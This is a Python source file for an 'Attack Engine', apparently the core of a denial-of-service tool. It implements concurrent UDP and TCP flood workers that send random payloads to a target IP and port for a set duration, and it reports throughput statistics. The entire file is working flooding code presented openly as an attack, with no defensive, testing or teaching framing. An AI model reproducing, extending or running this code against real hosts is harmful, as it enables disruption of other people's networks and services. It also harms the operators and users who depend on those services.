"""ᴍɪꜱꜱ ᴄʜᴜᴛᴋɪ — Attack Engine"""

from __future__ import annotations

import asyncio
import logging
import os
import socket
import time
from dataclasses import dataclass, field
from typing import List

LOGGER = logging.getLogger(__name__)


@dataclass
class AttackStats:
    sent_packets: int = 0
    failed_packets: int = 0
    bytes_sent: int = 0
    started_at: float = 0.0
    running: bool = False

    @property
    def elapsed(self) -> float:
        if not self.running or self.started_at == 0:
            return 0.001
        return max(0.001, time.time() - self.started_at)

    @property
    def pps(self) -> float:
        return self.sent_packets / self.elapsed

    @property
    def mbps(self) -> float:
        return (self.bytes_sent * 8) / self.elapsed / 1_000_000


class BufferPool:
    """Pre-generated random payloads for max throughput."""
    def __init__(self, size: int = 1200, count: int = 1024) -> None:
        self._buffers = [os.urandom(size) for _ in range(count)]
        self._idx = 0

    def next(self) -> bytes:
        buf = self._buffers[self._idx]
        self._idx = (self._idx + 1) % len(self._buffers)
        return buf


class AttackEngine:
    def __init__(self, max_threads: int, max_duration: int) -> None:
        self.max_threads = max_threads
        self.max_duration = max_duration
        self.stats = AttackStats()
        self._stop_event = asyncio.Event()
        self._workers: List[asyncio.Task] = []
        self._buffer_pool = BufferPool()

    def stop(self) -> None:
        self._stop_event.set()
        for task in self._workers:
            task.cancel()

    async def run_udp(self, ip: str, port: int, duration: int) -> AttackStats:
        run_secs = min(duration, self.max_duration)
        self.stats = AttackStats(started_at=time.time(), running=True)
        self._stop_event.clear()
        self._workers.clear()

        LOGGER.info(f"UDP flood → {ip}:{port} | {run_secs}s | {self.max_threads} threads")

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setblocking(False)

        for i in range(self.max_threads):
            task = asyncio.create_task(
                self._udp_worker(sock, ip, port),
                name=f"w{i}"
            )
            self._workers.append(task)

        try:
            try:
                await asyncio.wait_for(self._stop_event.wait(), timeout=run_secs)
            except asyncio.TimeoutError:
                pass
        finally:
            self._stop_event.set()
            for t in self._workers:
                if not t.done():
                    t.cancel()
            await asyncio.gather(*self._workers, return_exceptions=True)
            self._workers.clear()
            sock.close()
            self.stats.running = False

        return self.stats

    async def _udp_worker(self, sock: socket.socket, ip: str, port: int) -> None:
        loop = asyncio.get_running_loop()
        addr = (ip, port)
        while not self._stop_event.is_set():
            payload = self._buffer_pool.next()
            try:
                await loop.sock_sendto(sock, payload, addr)
                self.stats.sent_packets += 1
                self.stats.bytes_sent += len(payload)
            except BlockingIOError:
                await asyncio.sleep(0)
            except OSError as e:
                self.stats.failed_packets += 1
                if self.stats.failed_packets % 500 == 0:
                    LOGGER.debug(f"Send err: {e}")
            except asyncio.CancelledError:
                break
            except Exception as e:
                self.stats.failed_packets += 1
                LOGGER.debug(f"Worker err: {e}")

    async def run_tcp(self, ip: str, port: int, duration: int) -> AttackStats:
        run_secs = min(duration, self.max_duration)
        self.stats = AttackStats(started_at=time.time(), running=True)
        self._stop_event.clear()
        self._workers.clear()

        LOGGER.info(f"TCP flood → {ip}:{port} | {run_secs}s | {self.max_threads} threads")

        for i in range(self.max_threads):
            task = asyncio.create_task(
                self._tcp_worker(ip, port),
                name=f"tw{i}"
            )
            self._workers.append(task)

        try:
            try:
                await asyncio.wait_for(self._stop_event.wait(), timeout=run_secs)
            except asyncio.TimeoutError:
                pass
        finally:
            self._stop_event.set()
            for t in self._workers:
                if not t.done():
                    t.cancel()
            await asyncio.gather(*self._workers, return_exceptions=True)
            self._workers.clear()
            self.stats.running = False

        return self.stats

    async def _tcp_worker(self, ip: str, port: int) -> None:
        while not self._stop_event.is_set():
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(ip, port), timeout=2.0
                )
                payload = self._buffer_pool.next()
                writer.write(payload)
                await writer.drain()
                self.stats.sent_packets += 1
                self.stats.bytes_sent += len(payload)
                writer.close()
                try:
                    await writer.wait_closed()
                except Exception:
                    pass
            except asyncio.CancelledError:
                break
            except (OSError, asyncio.TimeoutError):
                self.stats.failed_packets += 1
            except Exception as e:
                self.stats.failed_packets += 1
                LOGGER.debug(f"TCP err: {e}")
